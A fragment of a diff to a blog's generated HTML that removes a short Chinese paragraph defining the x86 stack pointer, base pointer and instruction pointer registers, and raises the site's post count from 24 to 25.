-<p>几个常用的寄存器<br>sp/esp/rsp（16bit/32bit/64bit）栈寄存器—-指向栈顶<br>bp/ebp/rbp 栈基址寄存器—-指向栈底<br>ip/eip/rip 程序指令寄存器—-指向下一条待执行指令</p>
-
       
     </div>
 
@@ -1137,7 +1098,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">25</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
